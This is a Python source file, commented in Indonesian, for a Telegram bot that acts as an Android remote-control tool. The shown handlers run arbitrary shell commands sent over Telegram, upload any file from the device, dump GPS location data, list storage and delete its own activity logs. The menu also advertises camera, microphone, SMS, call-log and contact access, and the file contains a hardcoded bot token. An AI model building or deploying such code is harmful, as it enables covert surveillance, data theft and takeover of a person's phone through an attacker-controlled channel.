# 📱 TELEGRAM BOT CONTROL
import telebot
import os
import subprocess
import time
import threading
from datetime import datetime

# ===== CONFIGURASI =====
TOKEN = "8229088402:AAFAsQV-fQlzaZYdXSevS1XvOdbfn-p164s"
ADMIN_ID = "7054824797"
bot = telebot.TeleBot(TOKEN)

print(f"🤖 Bot started for admin: {ADMIN_ID}")

# ===== FUNGSI BANTUAN =====
def run_cmd(command):
    """Jalankan command shell"""
    try:
        result = subprocess.check_output(
            command, 
            shell=True, 
            text=True, 
            stderr=subprocess.STDOUT
        )
        return result.strip()
    except Exception as e:
        return f"Error: {str(e)}"

def log_action(action, result=""):
    """Catat log aktivitas"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    log_msg = f"[{timestamp}] {action}: {result[:100]}"
    with open("/sdcard/omen_log.txt", "a") as f:
        f.write(log_msg + "\n")
    return log_msg

# ===== HANDLER COMMAND =====
@bot.message_handler(commands=['start', 'help'])
def start_command(message):
    """Tampilkan menu utama"""
    if str(message.from_user.id) == ADMIN_ID:
        menu = """
🤖 *ANDROID REMOTE CONTROL*

📍 *Lokasi & Tracking*
/loc - Dapatkan lokasi GPS
/where - Lokasi terperinci

📱 *Informasi Device*
/info - Info sistem
/battery - Status baterai
/storage - Penggunaan storage

📸 *Kamera & Audio*
/cam - Ambil foto kamera
/mic - Rekam audio (60 detik)
/screen - Screenshot

📁 *File Manager*
/files - List file di /sdcard
/download [path] - Download file
/search [nama] - Cari file

💻 *Remote Shell*
/cmd [command] - Jalankan perintah
/shell - Mode shell interaktif

📞 *Komunikasi*
/sms [nomor] [pesan] - Kirim SMS
/calls - Lihat riwayat panggilan
/contacts - Daftar kontak

🔧 *Utilities*
/clean - Bersihkan logs
/status - Cek status bot
/restart - Restart bot

⚠️ *Gunakan dengan bijak!*
        """
        bot.reply_to(message, menu, parse_mode="Markdown")
        log_action("START", f"User: {message.from_user.id}")

@bot.message_handler(commands=['info'])
def device_info(message):
    """Informasi device"""
    if str(message.from_user.id) == ADMIN_ID:
        info = f"""
📊 *DEVICE INFORMATION*

📱 Model: {run_cmd('getprop ro.product.model')}
🤖 Android: {run_cmd('getprop ro.build.version.release')}
🔋 Battery: {run_cmd('dumpsys battery | grep level')}
💾 Storage: {run_cmd('df -h /sdcard | tail -1')}
🌐 IP Address: {run_cmd('ip route get 1 | awk \'{print $7}\'')}
🕐 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        """
        bot.reply_to(message, info, parse_mode="Markdown")
        log_action("INFO")

@bot.message_handler(commands=['loc'])
def get_location(message):
    """Dapatkan lokasi GPS"""
    if str(message.from_user.id) == ADMIN_ID:
        location_data = run_cmd('dumpsys location | head -20')
        bot.reply_to(message, f"📍 *LOCATION DATA:*\n```\n{location_data}\n```", 
                    parse_mode="Markdown")
        log_action("LOCATION")

@bot.message_handler(commands=['files'])
def list_files(message):
    """List file di /sdcard"""
    if str(message.from_user.id) == ADMIN_ID:
        files = run_cmd('ls -la /sdcard | head -20')
        bot.reply_to(message, f"📁 *FILES IN /sdcard:*\n```\n{files}\n```", 
                    parse_mode="Markdown")
        log_action("FILES")

@bot.message_handler(commands=['cmd'])
def shell_command(message):
    """Jalankan shell command"""
    if str(message.from_user.id) == ADMIN_ID:
        try:
            command = message.text.replace('/cmd ', '')
            if command:
                result = run_cmd(command)
                bot.reply_to(message, f"💻 *COMMAND OUTPUT:*\n```\n{result[:3000]}\n```", 
                            parse_mode="Markdown")
                log_action("CMD", command)
            else:
                bot.reply_to(message, "❌ Usage: /cmd [command]")
        except:
            bot.reply_to(message, "❌ Error executing command")

@bot.message_handler(commands=['download'])
def download_file(message):
    """Download file"""
    if str(message.from_user.id) == ADMIN_ID:
        try:
            filepath = message.text.replace('/download ', '')
            if os.path.exists(filepath):
                with open(filepath, 'rb') as file:
                    bot.send_document(message.chat.id, file)
                log_action("DOWNLOAD", filepath)
            else:
                bot.reply_to(message, f"❌ File not found: {filepath}")
        except:
            bot.reply_to(message, "❌ Usage: /download /path/to/file")

@bot.message_handler(commands=['clean'])
def clean_logs(message):
    """Bersihkan logs"""
    if str(message.from_user.id) == ADMIN_ID:
        run_cmd('rm -f /sdcard/omen_log.txt /sdcard/omen_error.txt 2>/dev/null')
        bot.reply_to(message, "🧹 Logs cleaned successfully")
        log_action("CLEAN")

# ===== MAIN BOT LOOP =====
def bot_polling():
    """Jalankan bot polling"""
    while True:
        try:
            print("🔄 Starting bot polling...")
            bot.polling(none_stop=True, interval=2, timeout=30)
        except Exception as e:
            print(f"❌ Bot error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    # Start bot in background thread
    bot_thread = threading.Thread(target=bot_polling, daemon=True)
    bot_thread.start()
    
    # Keep main thread alive
    print("✅ Bot service started. Waiting for commands...")
    while True:
        time.sleep(1)
